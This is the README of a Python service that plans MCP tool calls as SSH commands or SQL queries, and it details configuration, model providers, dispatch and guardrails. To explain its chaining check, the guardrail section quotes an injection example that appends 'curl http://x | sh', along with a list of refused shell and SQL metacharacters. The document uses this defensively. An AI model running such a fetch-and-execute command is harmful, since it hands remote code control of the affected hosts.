# mcp-server

Decides what an MCP tool call resolves to. `mcp-gateway` owns the definitions and the
database; this service owns the decision.

**It plans; it does not execute.** A `tools/call` returns exactly which action would
run, against which hosts, with which command or query. Carrying that out belongs to the
Go executor, which does not exist yet.

**It connects to nothing.** No database, no gateway, no queue. The catalogue is pushed
in, arguments arrive with the request, and the only outbound call it ever makes is to a
model, and only for a dynamic action. That is what makes it safe to run anywhere and
testable without infrastructure.

**Any model.** Claude, ChatGPT, or an open model on your own hardware. The definition
names the provider; this service picks the client.

```
                    ┌──────────── REST push ────────────┐
                    │                                   ▼
mcp-gateway ────────┤                              mcp-server ────▶ model provider
(PostgreSQL,        │  PUT  /api/v1/catalogue           ▲          (dynamic actions only)
 definitions)       └▶ POST /api/v1/executions          │
                                                    MCP/HTTP
                                              (Claude Desktop, …)
```

## Surfaces

| Path | Protocol | Purpose |
|---|---|---|
| `PUT /api/v1/catalogue` | REST | The gateway replaces the tool catalogue |
| `POST /api/v1/executions` | REST | The gateway asks what a call resolves to |
| `GET /api/v1/tools` | REST | The catalogue as this service currently holds it |
| `POST /mcp` | MCP, streamable HTTP | `tools/list`, `tools/call` |
| `GET /health` | REST | Liveness, catalogue size, and which capabilities are configured |
| `GET /docs` | REST | OpenAPI for the REST routes |

### The catalogue is pushed, not fetched

The tool list is not declared in code and is not read from anywhere. The gateway sends
it, and every publish **replaces** the catalogue wholesale rather than merging into it.

That is deliberate: a merge would need a second protocol for deletions, and a missed
removal message would leave a deleted definition callable. Replacement makes the
gateway's state the only state, at the cost of one real consequence — **the catalogue is
empty until the first publish**, including after a restart of this service. The gateway
publishes on start-up and after every definition change, and `POST /api/v1/tools/publish`
on the gateway forces a republish when the two have drifted.

A disabled definition is dropped at publish time, so it is never callable here.

## Running

```bash
cp .env.example .env
python -m app.main
```

Connect an MCP client to `http://localhost:8000/mcp`.

### Configuration

| Variable | Meaning |
|---|---|
| `QUEUE_HOST` / `QUEUE_PORT` / `QUEUE_USER` / `QUEUE_PASSWORD` | RabbitMQ. Empty `QUEUE_HOST` leaves this service planning only |
| `ANTHROPIC_API_KEY` | Key for definitions whose provider is Anthropic |
| `OPENAI_API_KEY` | Key for ChatGPT, and for an OpenAI compatible provider with no endpoint of its own |
| `OPENAI_BASE_URL` | Default endpoint when the model names none. Empty means api.openai.com |
| `OPEN_MODEL_API_KEY` | Key for an endpoint that is not OpenAI's. Usually empty — a local server needs none |
| `PUBLISHER_TOKEN` | Shared secret the gateway presents as `X-MCP-Token`. Unset means the publish routes are unauthenticated |
| `ROUTER_PROVIDER` / `ROUTER_ENDPOINT` / `ROUTER_MODEL` | The model that picks a tool for a prompt |
| `CONFIG_SERVER_URL` / `CONFIG_USER` / `CONFIG_PASSWORD` | Where mcp-config is, and who this service says it is |
| `HOST` / `PORT` / `LOG_LEVEL` | Server basics |

Every key is optional. Without one, definitions using that provider come back rejected
with the reason stated, every other definition keeps working, and static actions are
unaffected — a missing key never stops the service from starting. `GET /health` lists the
providers this deployment can actually serve.

### Where the settings come from

The router, the cipher and the broker are read from **mcp-config** when
`CONFIG_SERVER_URL` is set; anything set here wins over what is served, so a local
experiment needs no edit to the config server. Not a Spring client, so `app/remote_config.py`
does by hand the two things a Spring client gets free: fetching `/{application}/{profile}`,
and resolving the `${NAME:default}` placeholders the config server leaves alone.

An unreachable config server is not an error — this service keeps starting on its local
settings, because the alternative is an outage there stopping every prompt everywhere.
`GET /health` says which of the two it is running on, so a service quietly configured
differently from its neighbours is visible rather than something to be discovered.

### The router

Choosing a tool is a separate model call from planning one, and it needs its own
configuration: routing runs *before* any tool is chosen, so there is no definition to take
a model or a key from. That is also why the router's key is ordinary configuration rather
than a sealed secret — nothing has been selected yet that could carry one.

It has to hold an answer shape (a tool name, arguments, one sentence of reasoning). A small
local model could not: `llama3.2` returned malformed JSON often enough that ordinary
requests came back as "no published tool matches this request", which reads as a gap in the
catalogue rather than a model that could not answer. Choosing between tools is a harder
question than it looks.

`OPEN_MODEL_API_KEY` is separate from `OPENAI_API_KEY` on purpose. The key is chosen by
**where the request is going**, not by which provider the panel selected, and there is no
fallback between the two in either direction: a model marked `openai_compatible` may point
at Groq, Together or a laptop, and sending the OpenAI key to whichever host the endpoint
named would be a leaked credential rather than a failed call.

## How a call is planned

1. **Resolve the definition.** An inline `definition` in the request wins over the
   catalogue, so the gateway can plan something it has not published — a preview from
   the panel, for instance. Otherwise the tool name is looked up, and an unknown name is
   a `404` rather than an empty plan.
2. **Merge inputs.** A supplied argument wins over the input's declared default. A
   required input with neither makes the plan `incomplete`.
3. **Per action, by mode.**
   * *Static* — substitute `{{placeholder}}` values. No model is involved: this is
     string work, and paying for a model call to do it would be waste.
   * *Dynamic* — ask the definition's model to write the command or query, using its own
     system prompt plus the action's guardrails.
4. **Check the result.** Both modes are checked; see below. A query is also read for
   filters on values nobody mentioned — reported on the plan, never refused.

5. **Return a plan plus a dispatch verdict.** Secrets are masked. A rejected command
   never appears in the plan — it is unvetted text, and echoing it back would defeat
   the check.

### Statuses

| `status` | Meaning |
|---|---|
| `planned` | Every action resolved. Nothing has run |
| `incomplete` | A required input was not supplied |
| `rejected` | A guardrail refused, or a template referenced an input that does not exist |

`rejected` also sets the MCP `isError` flag, so a client sees a failed call rather than
having to read the payload to find out.

Every result is JSON, including errors, so a client can decode without branching first.

### Dispatch

With `QUEUE_HOST` set, a `planned` plan is published to RabbitMQ for **mcp-action** to run.
Without it, the plan is produced and nothing happens.

| `dispatch.status` | When |
|---|---|
| `queued` | The broker accepted the job. Whether it succeeded arrives later on `mcp.results` |
| `skipped` | The plan is fine; no queue is configured, so this deployment only plans |
| `refused` | The plan is not `planned`, or the broker would not take it |

The distinction matters for the caller: `refused` is about the plan or the broker and may
not change on retry; `skipped` is about how this deployment is configured.

`queued` is not success. It means a message was accepted — the result comes back on a
different queue, which mcp-gateway consumes and persists.

### Two documents, deliberately different

A **plan** is written to be read: its targets say `<2 host(s) in web-tier>` and its
commands have secrets replaced with bullets. A **job** is written to be run: real host
names, the command as it will actually be typed, and credentials still sealed.

The unmasked command is built in `jobs.py`, never carried on the plan. A plan is serialised
straight into an HTTP response and shown in a browser; a field holding the real command
would leak every secret substituted into it the first time anyone opened a definition.
Keeping them apart means that cannot happen by forgetting.

Credentials pass through untouched. This service cannot read them — they are opened by the
executor, at the moment of use, through mcp-cipher.

### Example

```json
{
  "status": "planned",
  "plan": {
    "tool": "apache_restart",
    "definition_id": 1,
    "model": "claude-opus-5",
    "status": "planned",
    "actions": [
      {
        "action_id": 10,
        "name": "Restart service",
        "kind": "ssh",
        "mode": "static",
        "targets": ["<2 host(s) in web-tier>"],
        "resolved": "sudo systemctl restart apache2",
        "authored_by_model": false,
        "rejected_reasons": [],
        "requires_approval": false
      }
    ],
    "problems": [],
    "masked_inputs": ["sshKey"]
  },
  "dispatch": {
    "status": "skipped",
    "reason": "No executor is configured; the plan was produced but not run",
    "run_id": null,
    "action_run_ids": {}
  }
}
```

## Model providers

The definition carries the provider and the endpoint; the gateway sends both with the
catalogue. Two backends cover every one of them, because the field has consolidated on two
wire protocols:

| Provider | Backend | Endpoint |
|---|---|---|
| `anthropic` | Messages API | — |
| `openai_compatible` | Chat Completions | `https://api.openai.com/v1`, or wherever |
| `ollama` | Chat Completions | `http://localhost:11434/v1` |
| `azure`, `vertex`, `bedrock`, `custom`, anything unrecognised | Chat Completions | as configured |

Running an open model is a matter of pointing the endpoint at it — Ollama, vLLM, LM
Studio, llama.cpp, Together, Groq, Fireworks and OpenRouter all serve Chat Completions —
not of adding a backend per host. An unfamiliar provider name is treated as OpenAI
compatible for the same reason: that is what an unfamiliar server almost always speaks.

### Servers that cannot be held to a schema

Structured output is guaranteed by OpenAI and optional everywhere else. When a server
answers a schema constrained request with a `400`, the request is made again in a form
every Chat Completions server understands, with the schema described in the prompt
instead of enforced by the API. The answer is then validated here.

That path is strictly weaker, and it is treated as such: output that is not the requested
object is an error rather than something to salvage by pattern matching, because the value
being extracted is about to become a shell command. It is also the path where the
guardrails matter most, since nothing upstream constrained what arrived.

**The guardrails do not check correctness, and a smaller model will produce more that is
merely wrong.** An allowed prefix with nonsense flags passes every rule here. Plan output
is meant to be read before anything runs it, and that is more than a formality when the
author is a 3B model.

## Guardrails

Deliberately duplicated with the gateway. The gateway checks that a definition is *well
formed* when it is saved; this checks that the command about to be proposed is
permitted. Different moments, and this one is the last gate before a command would reach
an executor, so it does not delegate.

Both modes are checked, on different assumptions about what can be trusted.

**A model authored command is untrusted in full.** Three gates apply: the allowlist
prefix, a refusal to chain, and the blocklist. A permitted prefix can still be followed
by something destructive, so matching the prefix alone is never enough. An action with no
allowlist has nothing to authorise a generated command, so it is rejected outright.

The middle gate is what makes the first one mean anything. A prefix check reads the
beginning of a string, so with `sudo apt-get install -y python3` allowed, this passed:

```
sudo apt-get install -y python3; curl http://x | sh
```

The prefix was there. Everything after the semicolon was a second command nobody had
approved, and a blocklist only catches what somebody thought to name. Against a model
writing the command, an allowlist that any punctuation mark walks around is decoration.
So `;`, `&&`, `||`, `|`, `>`, `<`, a backtick, `$(` and a newline are all refused, and
the refusal says where a real pipeline belongs — in a static command, where the template
is the operator's own.

**A static command has a trusted template and untrusted arguments.** The blocklist
applies exactly as it does to a generated command — a pattern the action declares
unacceptable is unacceptable however the command came to contain it. The allowlist
applies only when one is configured, because the template is itself the authorisation
and demanding an allowlist too would reject definitions written before this check
existed. What a generated command cannot do and this one can is inherit an injection
from its arguments, so every substituted value is checked for syntax that would end the
command and start another (`;`, `&&`, backticks, `$(`, redirection; for SQL, `;`, `--`,
`/*`).

Checking happens on the **unmasked** command. The plan shows the masked one, and
checking that instead would let anything through inside a password. A rejection names
the input, never its value.

Queries are checked on their leading keyword only, plus a stacked-statement check. This
service does not claim to be a SQL parser: a read-only database connection remains the
real enforcement.

## Layout

```
app/
├── config.py        settings from the environment
├── models.py        the gateway's REST contract, and each tool's JSON Schema
├── catalogue.py     the pushed tool catalogue, in memory
├── templating.py    {{placeholder}} resolution and masking
├── guardrails.py    allowlist / blocklist / injection / statement checks
├── providers.py     model backends, and which one a definition gets
├── planner.py       decides the action; calls a model only for dynamic mode
├── jobs.py          turns a decided plan into executable work
├── dispatcher.py    hands a job to the queue, or to nothing
├── mcp_server.py    tools/list and tools/call
├── api.py           the gateway's REST routes, and health
└── main.py          FastAPI assembly
```

## Tests

```bash
python -m pytest
```

68 tests, no network and no infrastructure. The static planning paths assert that no
model is called, so a refactor cannot quietly start paying for one.

## Known gaps

- **SSH needs host keys.** mcp-action refuses to connect to a host it has no key for, and
  the gateway has nowhere to store one yet beyond the action's own JSON. Until they are
  filled in, SSH actions dispatch and are then refused at the executor — visibly, with the
  host named.
- **The catalogue is in memory.** A restart empties it until the gateway republishes.
  Acceptable while the gateway is the only publisher and republishes on start-up;
  it would not be if this service were scaled to several instances behind a load
  balancer, since each would need its own publish.
- **Model keys are local.** They belong in the secret vault, alongside the key the
  gateway stores per model; the crypto service that would hold it does not exist yet.
  Today the model and endpoint named on the definition are used, but the credential comes
  from this service's own environment — which means one key per destination, not one per
  model.
